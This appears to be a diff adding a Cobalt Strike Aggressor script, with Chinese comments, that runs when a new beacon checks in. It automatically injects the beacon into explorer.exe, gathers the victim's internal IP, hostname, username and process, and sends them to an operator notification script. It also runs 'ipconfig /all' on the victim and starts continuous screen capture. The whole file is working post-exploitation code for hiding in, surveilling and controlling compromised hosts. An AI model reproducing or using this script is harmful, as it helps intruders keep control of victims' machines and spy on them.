@@ -1,0 +1,50 @@
+on beacon_initial {
+	
+	#自动迁移进程
+	sub callback{
+		$regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';
+		# 要迁移的进程
+		$listener = "ecloud";
+		# 监听器名字，此处为ecloud，记得修改为自己的
+		if ($2 ismatch $regex){
+			$pid = matched()[1];
+			$inject_pid = $pid;
+			if (-is64 $1){
+				$arch = "x64";
+			}
+			else{
+				$arch = "x86";
+			}
+			binject($1, $pid, $listener, $arch);
+		}
+	}
+	if($inject_pid != beacon_info($1,"pid")){
+		bps($1, &callback);
+	}
+
+	#上线提醒
+	println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+	local('$internalIP $computerName $userName $process');
+	$internalIP = replace(beacon_info($1,"internal")," ","_");
+	$computerName = replace(beacon_info($1,"computer")," ","_");
+	$userName = replace(beacon_info($1,"user")," ","_");
+	$process = replace(beacon_info($1,"process")," ","_");
+	$cmd = 'python3.9 /opt/tools/cs_open_jar/PushPlus.py' . " --computernam " . $computerName . " --internalip " . $internalIP . " --username " . $userName . " --process " . $process;
+	println("Sending server: " . $cmd);
+	exec($cmd);
+
+	#执行制定指定命令，用的shell命令 
+	bshell($1, "ipconfig /all");
+
+	#只截一张图
+	#binput($1, "screenshot");
+    #bscreenshot($1);
+	
+	#连续截图
+	binput($1, "screenwatch");
+    bscreenwatch($1);
+	
+
+
+}
+
